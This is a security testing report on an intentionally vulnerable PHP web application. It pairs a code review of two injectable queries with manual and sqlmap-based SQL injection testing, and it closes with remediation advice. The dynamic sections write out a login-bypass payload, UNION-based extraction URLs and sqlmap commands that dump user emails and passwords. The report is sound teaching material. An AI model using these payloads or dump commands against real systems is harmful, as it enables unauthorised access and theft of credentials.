**Test SQL Injection, on your own website**

1\. Project Overview

Project Name: **Test SQL Injection, on your own website**\
Target Application: <https://sovulnerable.wasmer.app/>

Testing Scope: Static Application Security Testing , Dynamic Application Security Testing (DAST): Manual SQL Injection Testing using payloads, Automated SQL Injection Testing using SQLMap

**Purpose**

\
Demonstrating how SQL injection vulnerabilities can be found in a vulnerable web application using both static and dynamic testing methods and to show the security risks tied to weak database query handling.

**2. Static Security Testing** 

**2.1 Goal**

Finding SQL injection vulnerabilities by code analysis without starting the application, focusing on vulnerable SQL query construction and weak handling of user input.

2. **Methodology**

A manual code review was done on backend PHP files responsible for user authentication, processing GET parameters and database query execution. The analysis focused on dynamic SQL query construction, direct use of user input, lack of prepared statements or parameter binding

**2.3 Vulnerable Code Findings**

**2.3.1 Login Authentication Vulnerability**

File: lib/auth.php

$sql = "SELECT id FROM users WHERE login = '$login' AND password = '$password'";

$query = $pdo->query($sql);

$user = $query->fetch();

Why This Code Is Vulnerable: User input ($login, $password) is directly integrated into the SQL query, no validation, sanitization, or parameterization is used, The SQL query structure can be exploited by attacker input.

Security Impact: An attacker can inject SQL logic such as ' OR 1=1--

This causes the authentication status to always be as true, allowing login without correct credentials.

This vulnerability can be detected by code inspection alone, as the query is constructed dynamically using untrusted input.

**2.3.2 GET Parameter SQL Injection Vulnerability**

File: contacts.php

$id = $\_GET['id'];

$sql = "SELECT \* FROM contacts WHERE id = $id";

$result = $pdo->query($sql);

Why This Code Is Vulnerable: The id parameter is taken directly from user input, no type checking or sanitization is performed, the input is injected directly into the SQL statement.

Security Impact: An attacker can manipulate the URL parameter to: Retrieve all database elements, extract database metadata, enumerate tables and columns

Example attack input:

contacts.php?id=1 OR 1=1

The unsafe handling of user input and dynamic SQL construction makes the application vulnerable to SQL injection.

**2.4 Static Testing Summary**

|**File**|`                        `**Vulnerability**|`                     `**Impact**|
| :- | :- | :- |
|lib/auth.php|`  `SQL query built using string concatenation|`      `Authentication bypass|
|contacts.php|`   `Unsanitized GET parameter in SQL query|`       `Data disclosure|
|Multiple files|`     `No prepared statements|`        `Full SQL injection exposure|

**2.5 Static Testing Conclusion**

The static analysis shows that the application uses unsafe coding practices that makes it weak against SQL injection attacks. These issues can be seen without executing the application, demonstrating the strength of static security testing in finding critical vulnerabilities early.

**3. Dynamic Security Testing (DAST)**

Dynamic testing was done by working with the running application and watching its reaction when payload was sent.

**3.1 Manual SQL Injection Testing (Dynamic)**

**3.1.1 Login Form Injection Testing**

Goal: Finding out if authentication can be bypassed using SQL injection.

Input Fields Tested: Username, Password

Payloads Used: ' or 1=1-- (Boolean-based bypass), ' or 1=1# (Comment-based bypass)

Test Procedure:

1. Opening the login page.
1. Enter the payload into both username and password boxes.

   ![](Aspose.Words.873d3854-57ae-4482-8bb7-303295b56e08.001.png)

   ![](Aspose.Words.873d3854-57ae-4482-8bb7-303295b56e08.002.png)

1. Try to log in.
1. Watch authentication reaction.![](Aspose.Words.873d3854-57ae-4482-8bb7-303295b56e08.003.png)

   ![](Aspose.Words.873d3854-57ae-4482-8bb7-303295b56e08.004.png)

Observation:\
Injected SQL logic exploits the authentication query, bypassing login controls.

**3.1.2 GET Parameter Injection Testing**

Goal: Test URL parameters for SQL injection vulnerabilities.

Original URL: <https://sovulnerable.wasmer.app/contacts.php?id=1>

Test URLs :

1. /contacts.php?id=1 OR 1=1 
1. /contacts.php?id=-1 UNION SELECT id,login,username,email,password,created\_at FROM users 
1. /contacts.php?id=-1 UNION SELECT 1,database(),3,4,5,6 
1. /contacts.php?id=-1 UNION SELECT 1,table\_name,3,4,5,6 FROM information\_schema.tables WHERE table\_schema=database() 

Expected Results:

1. Get all contacts 
1. Get users table 
1. Get table names
1. List all tables

Observation: SQL injection payloads exploit the backend query logic, allowing bypassing the authorization and accessing the data.

**3.2 Automated SQL Injection Testing Using SQLMap (Dynamic)**

Automated dynamic testing was done using SQLMap, a penetration testing script used to detect and exploit SQL injection vulnerabilities.










**3.2.1 Parameter Testing**

Target Parameter: id

Detected Techniques: Boolean-based blind injection, Error-based injection, Time-based blind injection, UNION-based injection

SQLMap Command:\
python3 sqlmap.py -u “<https://sovulnerable.wasmer.app/contacts.php?id=1>”

![](Aspose.Words.873d3854-57ae-4482-8bb7-303295b56e08.005.png)

Result: SQLMap has checked and confirmed the parameter is vulnerable to injection.

3\.2.3 Database Enumeration

Objective:\
Enumerate database structure using SQL injection.

Commands Used:

python3 sqlmap.py -u “<https://sovulnerable.wasmer.app/contacts.php?id=1>” -–tables (List tables)

python3 sqlmap.py -u “<https://sovulnerable.wasmer.app/contacts.php?id=1>” –tables -D gamedev\_php –-columns (List columns)


Results Summary:

![](Aspose.Words.873d3854-57ae-4482-8bb7-303295b56e08.006.png)

![](Aspose.Words.873d3854-57ae-4482-8bb7-303295b56e08.007.png)

![](Aspose.Words.873d3854-57ae-4482-8bb7-303295b56e08.008.png)

**3.2.4 Data Extraction**

Goal: Showing the effect of extracting sensitive data.

Data Dump Command:

python3 sqlmap.py -u “<https://sovulnerable.wasmer.app/contacts.php?id=1>” -D gamedev\_php -T users -C first\_name,last\_name,email,password --dump 







Results:

![](Aspose.Words.873d3854-57ae-4482-8bb7-303295b56e08.009.png)

![](Aspose.Words.873d3854-57ae-4482-8bb7-303295b56e08.010.png)

![](Aspose.Words.873d3854-57ae-4482-8bb7-303295b56e08.011.png)

![](Aspose.Words.873d3854-57ae-4482-8bb7-303295b56e08.012.png)

SQLMap took the database content successfully.




**4.Findings Summary**

**Static Testing Results**

|**Test Case**|`     `**Result**|`                        `**Notes**|
| :- | :- | :- |
|Source Code Review|`   `Vulnerable|`         `Dynamic SQL construction detected|

**Dynamic Testing Results (Manual)**

|**Test Case**|`    `**Result**|`                 `**Notes**|
| :- | :- | :- |
|Login Injection|` `Vulnerable|`      `Authentication bypass|
|GET Injection|` `Vulnerable|`            `Data exposure|

`                        `**Dynamic Testing Results (SQLMap)**

|**Test Case**|**Result**|**Notes**|
| :- | :- | :- |
|Parameter Detection|Injection Found|Multiple techniques|
|Database Enumeration|Successful|Full schema exposed|
|Data Extraction|Successful|Sensitive data retrieved|

5\. Security Analysis

Vulnerable Application Characteristics: Accepts unvalidated user input, uses dynamic SQL query integration, lacks prepared statements, allows full database enumeration, vulnerable to manual and automated SQL injection attacks

6\. Recommendations

Use prepared statements for all database queries, never concatenate user input directly into SQL, apply strict input validation and sanitization, perform regular static and dynamic security testing.

7\. Conclusion

This evaluation shows how static security testing can identify SQL injection vulnerabilities through code analysis, while dynamic testing confirms and exploits these weaknesses in a running application. The vulnerable application allows authentication bypass and complete database compromise, highlighting the critical risk posed by improper input handling and insecure SQL query construction.

